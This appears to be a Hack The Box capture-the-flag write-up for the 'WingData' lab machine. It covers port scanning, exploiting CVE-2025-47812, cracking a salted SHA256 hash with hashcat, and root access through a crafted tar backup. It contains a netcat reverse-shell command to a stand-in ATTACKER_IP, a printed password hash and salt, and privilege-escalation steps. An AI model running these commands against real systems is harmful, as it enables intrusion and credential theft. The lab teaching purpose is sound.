
# 2️⃣ WingData Writeup

# 🧑‍💻 Hack The Box – WingData

## Enumeration

Start with Nmap:

```bash
nmap -sC -sV wingdata.htb
````

Open ports:

* **22 → SSH**
* **80 → HTTP**

---

## Host Configuration

Add domain to `/etc/hosts`:

```bash
echo "TARGET_IP ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

---

## Vulnerability Discovery

The server version revealed vulnerability:

```
CVE-2025-47812
```

Public exploit available.

---

## Exploitation

Run the Python exploit:

```bash
python CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami" -v
```

Reverse shell:

```bash
python CVE-2025-47812.py -u http://ftp.wingdata.htb \
-c "nc ATTACKER_IP 8888 -e /bin/sh" -v
```

Listener:

```bash
nc -lvnp 8888
```

Shell obtained.

---

## Enumeration

Important directory:

```
Data/1
```

Inside:

```
settings.xml
```

Found:

* salt value
* usernames

Users discovered:

```
maria
jack
wacky
anonymous
```

---

## Password Cracking

The hash for **wacky**:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

Salt:

```
WingFTP
```

Hash type:

```
SHA256 + salt
```

Hashcat mode:

```
1410
```

Crack password:

```bash
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

Password recovered.

SSH login:

```bash
ssh wacky@target
```

User flag obtained.

---

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Found Python script that restores backups.

Script accepts `.tar` archive.

---

## Exploit Tar Vulnerability

Using exploit from:

```
https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f
```

Generate malicious tar:

```
backup_9999.tar
```

Place it inside:

```
/opt/backup_clients/backups/
```

Execute restore script:

```bash
sudo /usr/local/bin/python3 \
/opt/backup_clients/restore_backup_clients.py \
-b backup_9999.tar \
-r restore_evil
```

Root shell obtained.

---

## Flags

```
user.txt
root.txt
```

---

## Skills Learned

* Exploit development
* Hash cracking
* Reverse shells
* Tar privilege escalation
